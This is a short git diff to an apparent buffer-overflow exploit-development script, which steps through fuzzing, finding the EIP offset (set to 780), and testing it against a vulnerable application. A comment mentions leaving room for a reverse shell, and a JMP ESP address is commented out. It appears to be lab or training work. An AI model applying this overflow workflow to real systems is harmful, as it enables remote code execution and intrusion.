@@ -29,21 +29,29 @@ def main():
 	# test.fuzz_increment = 150
 
 	# Fuzz the vulnerable application
-	test.fuzz()
+	# test.fuzz()
 
 	# Sets the number of bytes to crash the application.
 	# Make sure to accomodate space for reverse shell!!
-	# test.num_bytes_crash = 1200
+	test.num_bytes_crash = 1000
+
+	# Sending pattern to determine offset
+	# test.send_pattern()
+
+	# Get offset 
+	# test.get_offset("30416B30")
+
+	# print(test.offset)
 
 	# Set the offset after running the functions to find offset value
-	# test.offset = 800
+	test.offset = 780
+
+	# Test offset found by `get_offset` function
+	test.test_offset()
 
 	# Set the memory address to jump to after finding valid memory address
 	# containing `jump` instructions set in x86 architecture
 	# test.jump_eip = "\x8f\x35\x4a\x5f"
-
-	# Sending pattern to determine offset
-	# test.send_pattern()
 
 
 if __name__ == '__main__':
